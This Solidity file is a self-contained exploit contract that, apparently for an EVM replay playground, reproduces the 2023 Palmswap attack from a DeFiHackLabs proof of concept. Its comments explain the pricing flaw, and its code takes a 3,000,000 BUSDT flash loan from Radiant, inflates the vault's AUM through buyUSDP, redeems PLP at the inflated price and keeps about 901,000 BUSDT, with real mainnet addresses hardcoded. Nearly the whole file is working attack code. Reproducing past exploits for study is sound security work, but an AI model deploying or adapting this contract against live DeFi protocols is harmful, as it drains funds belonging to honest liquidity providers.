// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-07-Palmswap).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (PalmswapTest IS the "attacker" — `attacker = address(this)`; the Radiant
// Aave-fork `executeOperation` flash-loan callback lives on the test itself),
// so there is no standalone contract to deploy. This contract is a faithful,
// self-contained copy of that inline attack so the playground can deploy it
// and record run(). Logic and constants are copied VERBATIM from
// test/Palmswap_exp.sol (testExploit / executeOperation / takeFlashLoanOnRadiant).
//
// Root cause: Palmswap (a GMX fork) prices its PLP LP token off the Vault's
// Assets-Under-Management (AUM), which is dominated by Vault.poolAmount.
// Vault.buyUSDP() increases poolAmount (and therefore AUM) but mints USDP, not
// PLP — so it retroactively re-prices every outstanding PLP upward without
// issuing new PLP. At the attack block buyUSDP/sellUSDP were reachable by
// anyone and the PLP cooldown was 0, so: (1) mint PLP at the current LOW aum
// via LiquidityEvent.purchasePlp, (2) call Vault.buyUSDP directly to inflate
// poolAmount/AUM ~2x with NO new PLP minted, (3) redeem the just-minted PLP via
// LiquidityEvent.unstakeAndRedeemPlp at the now-INFLATED aum, (4) sell back the
// USDP received in step 2 via Vault.sellUSDP to recover that capital, (5) repay
// the flash loan. All financed by a Radiant (Aave-fork) flash loan of 3,000,000
// BUSDT; net profit ~901,456.59 BUSDT, drained from the honest PLP backing.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IVault {
    function buyUSDP(address _receiver) external returns (uint256);
    function sellUSDP(address _receiver) external returns (uint256);
}

interface ILiquidityEvent {
    function purchasePlp(uint256 _amountIn, uint256 _minUsdp, uint256 _minPlp) external returns (uint256 amountOut);
    function unstakeAndRedeemPlp(uint256 _plpAmount, uint256 _minOut, address _receiver) external returns (uint256);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

contract PalmswapDrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant PLP = IERC20(0x8b47515579c39a31871D874a23Fb87517b975eCC);
    IERC20 constant USDP = IERC20(0x04C7c8476F91D2D6Da5CaDA3B3e17FC4532Fe0cc);
    IVault constant Vault = IVault(0x806f709558CDBBa39699FBf323C8fDA4e364Ac7A);
    ILiquidityEvent constant LiquidityEvent = ILiquidityEvent(0xd990094A611c3De34664dd3664ebf979A1230FC1);
    IAaveFlashloan constant RadiantLP = IAaveFlashloan(0xd50Cf00b6e600Dd036Ba8eF475677d816d6c4281);
    address constant plpManager = 0x6876B9804719d8D9F5AEb6ad1322270458fA99E0;
    address constant fPLP = 0x305496cecCe61491794a4c36D322b42Bb81da9c4;

    // The recorded entrypoint. Mirrors PalmswapTest.testExploit(): approve the
    // BUSDT/PLP working capital, then take the Radiant (Aave-fork) flash loan —
    // the callback (executeOperation) below does the real work. Profit (net
    // BUSDT drained) is left sitting on this contract's own balance.
    function run() external {
        BUSDT.approve(plpManager, type(uint256).max);
        BUSDT.approve(address(RadiantLP), type(uint256).max);
        PLP.approve(fPLP, type(uint256).max);

        takeFlashLoanOnRadiant();
    }

    // Radiant (Aave-fork) flash-loan callback — verbatim from the test.
    function executeOperation(
        address[] calldata /* assets */,
        uint256[] calldata /* amounts */,
        uint256[] calldata /* premiums */,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        // Step 1: mint PLP at the CURRENT (low) aum. Exchange rate USDP:PLP is ~1:1.
        uint256 amountOut = LiquidityEvent.purchasePlp(1_000_000 * 1e18, 0, 0);

        // Step 2: inflate poolAmount/AUM directly via buyUSDP — mints USDP, NOT
        // PLP, so this re-prices every existing PLP upward without new supply.
        BUSDT.transfer(address(Vault), 2_000_000 * 1e18);
        Vault.buyUSDP(address(this));

        // Step 3: redeem the just-minted PLP at the now-INFLATED aum (~1.96x).
        uint256 amountUSDP = LiquidityEvent.unstakeAndRedeemPlp(amountOut - 13_294 * 1e15, 0, address(this));

        // Step 4: sell back the USDP received in step 2 to recover that capital.
        USDP.transfer(address(Vault), amountUSDP - 3154 * 1e18);
        Vault.sellUSDP(address(this));

        return true;
    }

    function takeFlashLoanOnRadiant() internal {
        address[] memory assets = new address[](1);
        assets[0] = address(BUSDT);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 3_000_000 * 1e18;
        uint256[] memory modes = new uint256[](1);
        modes[0] = 0;
        RadiantLP.flashLoan(address(this), assets, amounts, modes, address(this), bytes(""), 0);
    }
}
